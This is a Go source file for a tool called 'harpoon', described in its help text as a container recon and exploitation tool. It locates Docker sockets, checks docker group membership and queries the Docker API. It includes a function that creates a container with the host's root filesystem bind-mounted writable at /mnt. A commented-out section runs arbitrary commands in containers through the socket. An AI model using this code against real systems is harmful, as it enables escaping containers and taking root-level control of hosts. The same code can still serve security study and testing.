package main

import (
  "bytes"
  "context"
  //"encoding/json"
  "fmt"
  "github.com/urfave/cli"
  "io/ioutil"
  "log"
  "net"
  "net/http"
  "os"
  "os/exec"
  "strings"
)

type dockerInfo struct {
  hasDocker       bool
  dockerSockPath  []string
  dockerApiVer    string
  dockerVer       string
  dockerUserGroup bool
}

func querySocket(socketPath string, method string, path string, payload string) string {
  //var message string = method + " " + path + " HTTP/1.1\n\r" + "Host:\n\r" + "\n\r"
  httpc := http.Client{
    Transport: &http.Transport{
      DialContext: func(_ context.Context, _, _ string) (net.Conn, error) {
        return net.Dial("unix", socketPath)
      },
    },
  }

  var response *http.Response
  var err error
  switch method {
  case "GET":
    response, err = httpc.Get("http://unix" + path)
    if err != nil {
      panic(err)
    }
  case "POST":
    response, err = httpc.Post("http://unix"+path, "application/json", strings.NewReader(payload))
    if err != nil {
      panic(err)
    }
  }

  defer response.Body.Close()
  body, err := ioutil.ReadAll(response.Body)
  if err != nil {
    panic(err)
  }
  //response, err = httpc.Post("http://unix"+flag.Args()[1], "application/octet-stream", strings.NewReader(*post))
  return string(body)
}

func (di dockerInfo) toString() string {
  var sb strings.Builder
  //sb.WriteString(fmt.Sprintf("\thas_docker: %v\n", di.hasDocker))
  sb.WriteString(fmt.Sprintf("\tsocket_paths: %v\n", di.dockerSockPath))
  sb.WriteString(fmt.Sprintf("\tdocker_ver_info: %v\n", di.dockerApiVer))
  sb.WriteString(fmt.Sprintf("\tin_docker_group: %v\n", di.dockerUserGroup))
  return sb.String()
}

func (di dockerInfo) findDockerSocket() []string {
  stdout, _ := execCmd("find / -name docker.sock")
  socks := make([]string, 1)
  for _, e := range strings.Split(stdout.String(), "\n") {
    if e != "" {
      socks = append(socks, e)
    }
  }
  return socks
}

func (di dockerInfo) isDockerUser() bool {
  stdout, _ := execCmd("groups")
  return strings.Contains(stdout.String(), "docker")
}

func (di dockerInfo) findDockerApiVer() string {
  // curl -s -XGET --unix-socket /run/docker.sock http://localhost/version 2>&1
  var verInfo bytes.Buffer
  hasDocker, _ := execCmd("which docker")
  //fmt.Println(hasDocker.String())
  if hasDocker.String() != "" {
    fmt.Print("[+] Found docker bin: " + hasDocker.String())
    di.hasDocker = true
    verInfo, _ = execCmd("docker version")
  } else if di.dockerSockPath != nil {
    if len(di.dockerSockPath) >= 1 {
      // just take the first value
      fmt.Println("[+] Docker socket: " + di.dockerSockPath[1])
      var dockerSocket string = di.dockerSockPath[1]
      verInfoStr := querySocket(dockerSocket, "GET", "/version", "")
      return verInfoStr
    }
  }
  return verInfo.String()
}

type kubernetesInfo struct {
}

func execCmd(cmdStr string) (bytes.Buffer, bytes.Buffer) {
  cmdArr := strings.Split(cmdStr, " ")
  var stdout, stderr bytes.Buffer
  cmd := exec.Command(cmdArr[0], cmdArr[1:]...)
  cmd.Stdout = &stdout
  cmd.Stderr = &stderr
  cmd.Run()
  return stdout, stderr
}

func createContainer(socketPath string, mount string) string {
  var payload string = `{"Image":"ubuntu","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","ReadOnly":false,"Source":"/","Target":"/mnt"}]}`
  res := querySocket(socketPath, "POST", "/containers/create", payload)
  return res
}

func startContainer(socketPath string, containerId string) string {
  var path string = "/containers/" + containerId + "/start"
  res := querySocket(socketPath, "POST", path, "")
  return res
}

func runChecks(mask uint8) {
  runAll := false
  if mask == 0xF0 {
    runAll = true
    mask = 0x80
    // run all the checks
  }
  if mask == 0x80 {
    dockerInfo := dockerInfo{}
    if runAll {
      //modify the mask
      mask = 0x40
    }
    socks := dockerInfo.findDockerSocket()
    if socks != nil {
      dockerInfo.dockerSockPath = socks
    }
    dockerInfo.dockerUserGroup = dockerInfo.isDockerUser()
    r := strings.NewReplacer("\n", "\n\t\t")
    dockerApiInfo := dockerInfo.findDockerApiVer()
    dockerInfo.dockerApiVer = fmt.Sprintf("\n\t\t%s\n", r.Replace(dockerApiInfo))
    // display found info
    fmt.Printf("[+] Docker info found:\n")
    fmt.Printf("%s", dockerInfo.toString())
  }
  if mask == 0x40 {
    if runAll {
      mask = 0x20
    }
    fmt.Println("[-] Not implemented")
  }
  if mask == 0x20 {
    if runAll {
      mask = 0x10
    }
    fmt.Println("[-] Not implemented")
  }
  if mask == 0x10 {
    fmt.Println("[-] Not implemented")
  }
}

func main() {
  var help string = `Containerization recon and exploitation tool.

                          ,   ,
    ~~~~~~~~~~~~~~~~~~~~~~~"o"~~~~
            ____________     o
         _--            --_ o
        /       ___      __\ o
       / _         _\    \__o 
      / / |              X  |
     / /   \               /
    / _ \   \             /
    \/ \/    -.____ ____.-

`

  // Utilize cli package for command line interface, rather than rolling our own messy one.
  app := cli.NewApp()
  app.Name = "harpoon"
  app.Usage = help

  // Define subcommands
  app.Commands = []cli.Command{
    {
      Name:    "fingerprint",
      Aliases: []string{"fp"},
      Usage:   "fingerprint the system for various container tech and settings",
      Flags: []cli.Flag{
        cli.BoolFlag{
          Name:  "all, a",
          Usage: "run all checks",
        },
        cli.BoolFlag{
          Name:  "docker, d",
          Usage: "run only the docker checks",
        },
        cli.BoolFlag{
          Name:  "kube, k",
          Usage: "run only the kubernetes checks",
        },
        cli.BoolFlag{
          Name:  "lxc, l",
          Usage: "run only the lxc checks",
        },
        cli.BoolFlag{
          Name:  "discover, D",
          Usage: "attempt to discover what container tech, if any, is in place",
        },
      },
      Action: func(c *cli.Context) error {
        //fmt.Println(c.Bool("all"))
        var flagMask uint8 = 0x0 // 00000000
        if c.Bool("all") {
          // set the lower 4 bits to 1
          // flagMask = flagMask & 0xF8
          runChecks(0xF0)
          return nil
        }
        if c.Bool("docker") {
          // set the fist bit of the mask
          flagMask = flagMask | 0x80
          runChecks(flagMask)
        }
        if c.Bool("kube") {
          // set the second bit of the mask
          flagMask = flagMask | 0x40
        }
        if c.Bool("lxc") {
          flagMask = flagMask | 0x20
        }
        if c.Bool("discover") {
          flagMask = flagMask | 0x10
        }
        return nil
      },
    },
  }

  err := app.Run(os.Args)
  if err != nil {
    log.Fatal(err)
  }

  /*
     // set up command line opts
     findCommand := flag.NewFlagSet("fingerprint", flag.ExitOnError)
     createCommand := flag.NewFlagSet("create", flag.ExitOnError)
     socketFlag := createCommand.String("sock", "/run/docker.sock", "The path to the docker socket.")
     mountFlag := createCommand.String("mount", "/:/mnt", "What file to from the host to mount and where to mount it.")
     startCommand := flag.NewFlagSet("start", flag.ExitOnError)
     containerIdStartFlag := startCommand.String("container_id", "", "The id of the container to try and execute commands in.")
     execCommand := flag.NewFlagSet("exec", flag.ExitOnError)
     containerIdFlag := execCommand.String("container_id", "", "The id of the container to try and execute commands in.")
     commandFlag := execCommand.String("cmd", "", "The command to execute inside of the container.")

     dockerInfo := dockerInfo{}
     //kubernetesInfo := kubernetesInfo{}

     if len(os.Args) == 1 {
       fmt.Println(help)
       os.Exit(1)
     }

     switch os.Args[1] {
     case "fingerprint":
       findCommand.Parse(os.Args[2:])
       socks := dockerInfo.findDockerSocket()
       if socks != nil {
         dockerInfo.dockerSockPath = socks
       }
       dockerInfo.dockerUserGroup = dockerInfo.isDockerUser()
       r := strings.NewReplacer("\n", "\n\t\t")
       dockerApiInfo := dockerInfo.findDockerApiVer()
       dockerInfo.dockerApiVer = fmt.Sprintf("\n\t\t%s\n", r.Replace(dockerApiInfo))
       // display found info
       fmt.Printf("[+] Docker info found:\n")
       fmt.Println(dockerInfo.toString())
     case "create":
       createCommand.Parse(os.Args[2:])
       if createCommand.Parsed() {
         if *mountFlag == "" {
           fmt.Println(help)
           return
         }
         if *socketFlag == "" {
           fmt.Println(help)
           return
         }
         res := createContainer(*socketFlag, *mountFlag)
         fmt.Println(res)
       }
     case "start":
       startCommand.Parse(os.Args[2:])
       if startCommand.Parsed() {
         if *socketFlag == "" {
           fmt.Println(help)
           return
         }
         if *containerIdStartFlag == "" {
           fmt.Println(help)
         }
         res := startContainer(*socketFlag, *containerIdStartFlag)
         fmt.Println(res)
       }
     case "exec":
       execCommand.Parse(os.Args[2:])
       if execCommand.Parsed() {
         if *socketFlag == "" {
           fmt.Println(help)
           return
         }
         if *containerIdFlag == "" {
           fmt.Println(help)
           return
         }
         if *commandFlag == "" {
           fmt.Println(help)
           return
         }
         // set up an exec
         cmdStr := strings.Trim(strings.Join(strings.Fields(fmt.Sprintf(*commandFlag)), "\",\""), "[]")
         payload := `{"AttachStdin": false,"AttachStdout": true,"AttachStderr": true,"DetachKeys": "ctrl-p,ctrl-q","Tty": false,"Cmd":["` + cmdStr + `"]}`
         res := querySocket(*socketFlag, "POST", "/containers/"+*containerIdFlag+"/exec", payload)
         fmt.Println(res)
         byt := []byte(res)
         var dat map[string]interface{}
         if err := json.Unmarshal(byt, &dat); err != nil {
           panic(err)
         }
         fmt.Println(dat["Id"])
         payload = `{"Detach": false, "Tty": false}`
         res = querySocket(*socketFlag, "POST", "/exec/"+dat["Id"].(string)+"/start", payload)
         fmt.Println(res)
       }
     }
  */
}
